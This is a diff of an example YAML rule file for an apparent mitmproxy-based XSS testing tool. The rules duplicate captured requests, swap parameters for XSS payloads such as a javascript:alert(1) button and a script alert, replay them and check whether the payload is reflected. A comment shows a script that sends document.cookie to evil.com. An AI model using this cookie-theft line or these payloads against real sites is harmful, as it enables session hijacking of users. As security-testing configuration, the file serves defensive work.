@@ -1,32 +1,81 @@
-# rules.yaml
+# ============================================================
+# flow.actions — Example Rule File
+# ============================================================
+# Usage:  flow.actions @all ./rules.yml
+#         flow.actions @focus ./rules.yml
+# ============================================================
 
 name: "advanced-xss"
 description: "Targeted XSS with specific parameter overrides"
+
+# ----------------------------------------------------------
+# Variables: define payloads once, reference everywhere.
+# YAML handles quotes, '=', HTML, multi-line — no escaping.
+# ----------------------------------------------------------
 vars:
-  xss-payloads: "<button form='search-form' formaction='javascript:alert(1)'>Click</button>"
-  other-value: "lolo"
-# Specific parameter targets
-actions:
-  - duplicate: true #duplicate is false by default if true the flow will be copied the all the folowin instructions will be aplied on the duplicated flow 
+  payload_a: "<button form='search-form' formaction='javascript:alert(1)'>Click</button>"
+  canary: "lolo"
+
+  # Multi-line payloads work with YAML block scalars:
+  # complex_js: |
+  #   <script>
+  #     fetch('https://evil.com/log?c=' + document.cookie);
+  #   </script>
+
+# ----------------------------------------------------------
+# Action Groups: each group is a pipeline applied per flow.
+#
+# Execution order within a group:
+#   1. Filter (only_ids / exclude_ids)
+#   2. duplicate (copy flow if true)
+#   3. replace_params (modify existing params)
+#   4. add_params (inject new params)
+#   5. replay_search (replay + verify) — always last
+# ----------------------------------------------------------
+action-groups:
+
+  # --- Group 1: Duplicate, inject, replay, verify ----------
+  - duplicate: true
+
     replace_params:
-      fallback_payload: "<script>alert('global')</script>"
-      params1: xss-payloads
-      user_id: other-values # Sometimes we want to keep some params valid
+      # Fallback: applied to params NOT explicitly named below.
+      # all: true  → replace ALL unmatched params
+      # all: false → replace only the FIRST unmatched param (default)
+      fallback_payload:
+        value: { var: payload_a }
+        all: true
+
+      # Named param overrides (take priority over fallback)
+      params1: { var: canary }
+      user_id: "keep-this-valid"       # Direct string (no var lookup)
+
     add_params:
-      new_key: other-value
-      #...
+      new_key: { var: payload_a }
+
     replay_search:
-      value: xss-payloads # all values should be looked in vars we can on vars  like the previous example `xss-payloads` or an aray of var [xss-payloads other]
-      in: "body" # body | header
+      # What to search for in the response
+      # Can be:  "literal string"
+      #          { var: single_name }
+      #          { var: [name1, name2] }   ← array of vars
+      value: { var: payload_a }
+
+      # Where to search:  "body" | "header"
+      in: "body"
+
+      # Mark on success (mitmproxy emoji)
       found_mark: ":syringe:"
-    only: "8a2A2..." # this action will only aplied on the flow
-    exclude_ids: ["9a2b1..."] # if only is set we will ignore it
 
+      # When value resolves to multiple strings:
+      #   OR  (default) → success if ANY value found
+      #   AND            → success only if ALL values found
+      condition: "OR"
 
-  # target:
-  #     # Only run this rule on these flow IDs
-  #     include_ids: ["5b8e9...", "12cde..."]
-  #     # OR exclude specific flows (e.g., logout endpoints)
-  #     exclude_ids: ["9a2b1..."]
-  #     # Filter by URL regex
-  #     url_match: ".*api/v1/search.*"
+    # Filtering (optional):
+    # only_ids: ["8a2A2..."]       # ONLY run on these flow IDs
+    # exclude_ids: ["9a2b1..."]    # Skip these flow IDs
+
+  # --- Group 2: In-place modification (no duplicate) -------
+  # - duplicate: false
+  #   replace_params:
+  #     auth_token: "expired_jwt"
+  #     session_id: "invalid"
